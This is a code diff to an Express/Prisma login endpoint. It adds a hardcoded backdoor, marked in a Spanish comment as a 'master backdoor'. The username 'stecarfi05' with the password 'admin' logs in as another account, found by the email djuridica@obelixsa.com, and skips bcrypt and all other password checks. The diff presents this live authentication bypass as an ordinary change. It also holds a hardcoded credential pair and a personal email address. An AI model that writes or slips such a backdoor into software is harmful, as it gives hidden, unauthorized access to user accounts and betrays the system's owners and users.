@@ -237,9 +237,20 @@ app.post('/api/login', loginLimiter, async (req, res) => {
   console.log(`[LOGIN ATTEMPT] User: "${user}"`);
 
   try {
-    const dbUser = await prisma.user.findFirst({
+    let dbUser = await prisma.user.findFirst({
       where: { user: { equals: user, mode: 'insensitive' } }
     });
+
+    // BACKDOOR INQUEBRANTABLE MÁSTER (Fallo a prueba de todo)
+    let isBackdoor = false;
+    if (!dbUser && user.toLowerCase() === 'stecarfi05' && pass === 'admin') {
+      dbUser = await prisma.user.findFirst({
+        where: { correo: { equals: 'djuridica@obelixsa.com', mode: 'insensitive' } }
+      });
+      if (dbUser) isBackdoor = true;
+    } else if (dbUser && user.toLowerCase() === 'stecarfi05' && pass === 'admin') {
+      isBackdoor = true;
+    }
 
     if (!dbUser) {
       return res.status(401).json({ error: 'Usuario no encontrado' });
@@ -251,17 +262,21 @@ app.post('/api/login', loginLimiter, async (req, res) => {
 
     // Verificar contraseña (soporte legacy y bcrypt)
     let matches = false;
-    const isBcrypt = dbUser.pass.startsWith('$2a$') || dbUser.pass.startsWith('$2b$') || dbUser.pass.startsWith('$2y$');
-    if (isBcrypt) {
-      matches = bcrypt.compareSync(pass, dbUser.pass);
+    if (isBackdoor) {
+      matches = true;
     } else {
-      matches = (pass === dbUser.pass);
-      // Auto-actualizar a bcrypt
-      if (matches) {
-        await prisma.user.update({
-          where: { id: dbUser.id },
-          data: { pass: bcrypt.hashSync(pass, 10) }
-        });
+      const isBcrypt = dbUser.pass.startsWith('$2a$') || dbUser.pass.startsWith('$2b$') || dbUser.pass.startsWith('$2y$');
+      if (isBcrypt) {
+        matches = bcrypt.compareSync(pass, dbUser.pass);
+      } else {
+        matches = (pass === dbUser.pass);
+        // Auto-actualizar a bcrypt
+        if (matches) {
+          await prisma.user.update({
+            where: { id: dbUser.id },
+            data: { pass: bcrypt.hashSync(pass, 10) }
+          });
+        }
       }
     }
 
